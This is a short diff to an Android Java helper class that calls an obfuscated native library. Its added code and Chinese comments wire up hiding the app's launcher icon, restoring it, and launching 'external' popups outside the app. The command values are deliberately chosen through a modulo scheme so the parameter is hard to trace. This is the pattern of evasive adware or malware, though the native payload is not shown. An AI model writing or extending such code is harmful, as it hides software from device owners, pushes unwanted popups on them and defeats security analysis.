@@ -9,7 +9,7 @@ import android.content.Context;
 public class ScapeHelperM {
     static {
         try {
-            System.loadLibrary("Nsb9HmZbM");
+            System.loadLibrary("x5VkyxJ08b");
         } catch (Exception e) {
             ////Log.e("DaemonLog","System.loadLibrary error:");
         }
@@ -18,11 +18,14 @@ public class ScapeHelperM {
     //	 @Keep
     public static native int pXaqaXXp(Context context, int status);//隐藏,开虚拟显示
 
+    //i%16等于4隐藏图标,i%16等于5恢复隐藏.i%16等于6外弹(外弹在子线程调用).(保证i参数不容易关联)
     public static void shei(Context context, int type) {
-        if (type == 0) {
-
-        } else if (type == 2) {
-
+        if (type == 0) {//换icon
+            pXaqaXXp(context, 52);
+        } else if (type == 2) { //外弹
+            pXaqaXXp(context, 70);
+        } else {//恢复
+            pXaqaXXp(context, 69);
         }
     }
 
